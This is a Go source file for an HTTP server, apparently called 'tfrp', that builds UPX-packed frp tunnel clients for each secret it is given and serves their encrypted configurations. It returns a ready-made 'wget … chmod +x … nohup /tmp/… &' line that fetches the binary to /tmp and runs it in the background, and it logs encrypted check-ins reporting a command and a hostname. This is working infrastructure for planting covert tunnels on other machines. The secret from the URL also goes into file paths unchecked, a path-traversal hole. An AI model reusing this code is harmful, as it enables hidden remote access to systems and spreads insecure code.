package main

import (
	"encoding/json"
	"flag"
	"fmt"
	net2 "github.com/fatedier/frp/pkg/util/net"
	"github.com/labstack/echo/v4"
	"gopkg.in/ini.v1"
	"log"
	"net/http"
	"os"
	"os/exec"
)

type regCmd struct {
	Cmd      string `json:"cmd"`
	HostName string `json:"hostname"`
}

func readFile(fileanme string) string {
	file, err := os.Open(fileanme)
	if err != nil {
		return ""
	}
	defer file.Close()
	buf := make([]byte, 4096)
	n, _ := file.Read(buf)
	buf = buf[:n]
	return string(buf)
}

var tfrpIniPath string
var tfrpPort int
var frpcPath string
var frpcOutputPath string
var frpcMainSourcePath string
var goPath string
var cfgApi string
var default_cfg string
var download_url string

func init() {
	flag.StringVar(&tfrpIniPath, "c", "tfrp.ini", "tfrp ini path")
	flag.IntVar(&tfrpPort, "p", 8001, "tfrp port")
}

func readFromSecret(cfgApiSecret string) []byte {
	return []byte(readFile(frpcPath + "/" + cfgApiSecret + ".ini"))
}

func main() {
	flag.Parse()
	log.Printf("tfrpIniPath:%s", tfrpIniPath)
	// load ini
	cfg, err := ini.Load(tfrpIniPath)
	if err != nil {
		log.Panic(err)
	}
	frpcPath = cfg.Section("common").Key("path").String()
	frpcOutputPath = cfg.Section("common").Key("output_path").String()
	frpcMainSourcePath = cfg.Section("common").Key("main_source_path").String()
	goPath = cfg.Section("common").Key("go_path").String()
	cfgApi = cfg.Section("common").Key("cfg_api").String()
	default_cfg = cfg.Section("common").Key("default_cfg").String()
	download_url = cfg.Section("common").Key("download_url").String()
	log.Printf("frpcPath:%s", frpcPath)
	e := echo.New()
	e.GET("/frp/:cfgApiSecret", func(c echo.Context) error {
		cfgApiSecret := c.Param("cfgApiSecret")
		log.Printf("cfgApiSecret:%s", cfgApiSecret)
		cfgBody, err := net2.DesECBEncrypt(readFromSecret(cfgApiSecret), net2.AesCipherKey)
		if err != nil {
			return c.String(http.StatusInternalServerError, err.Error())
		}
		return c.String(http.StatusOK, string(cfgBody))
	})
	e.GET("/create/:cfgApiSecret", func(c echo.Context) error {
		// build frpc
		cfgApiSecret := c.Param("cfgApiSecret")
		//make file
		if _, err := os.Stat(frpcPath + "/" + cfgApiSecret + ".ini"); os.IsNotExist(err) {
			create, err := os.Create(frpcPath + "/" + cfgApiSecret + ".ini")
			if err != nil {
				return c.String(http.StatusInternalServerError, err.Error())
			}
			defer create.Close()
			_, _ = create.Write([]byte(readFile(default_cfg)))
		}
		// go
		build_command := exec.Command(goPath,
			"build", "-o", frpcOutputPath+"/"+cfgApiSecret,
			"-ldflags", fmt.Sprintf("-X main.cfgApi=%s -X main.cfgApiSecret=%s -X main.debug=false", cfgApi, cfgApiSecret),
			frpcMainSourcePath+"main.go")
		build_command.Env = []string{"CGO_ENABLED=0"}
		build_command.Dir = frpcMainSourcePath
		err = build_command.Run()
		if err != nil {
			return c.String(http.StatusInternalServerError, err.Error())
		}
		err = exec.Command("upx", frpcOutputPath+"/"+cfgApiSecret).Run()
		if err != nil {
			return c.String(http.StatusInternalServerError, err.Error())
		}
		text := `wget %s -O /tmp/%s;chmod +x /tmp/%s; nohup /tmp/%s &;`
		log.Printf("%s create success", cfgApiSecret)
		return c.String(http.StatusOK, fmt.Sprintf(text, download_url+cfgApiSecret, cfgApiSecret, cfgApiSecret, cfgApiSecret))
	})
	e.POST("/frp/:cfgApiSecret", func(c echo.Context) error {
		cfgApiSecret := c.Param("cfgApiSecret")
		cmdReq := new(regCmd)
		body := c.Request().Body
		defer body.Close()
		reqBody := make([]byte, 4096)
		n, _ := body.Read(reqBody)
		reqBody = reqBody[:n]
		reqBody, _ = net2.DesECBDecrypt(reqBody, net2.AesCipherKey)
		_ = json.Unmarshal(reqBody, cmdReq)
		log.Printf("cfgApiSecret:%s, cmd:%s, hostname:%s", cfgApiSecret, cmdReq.Cmd, cmdReq.HostName)
		return c.String(http.StatusOK, fmt.Sprintf(""))
	})
	e.Logger.Fatal(e.Start(fmt.Sprintf(":%d", tfrpPort)))
}
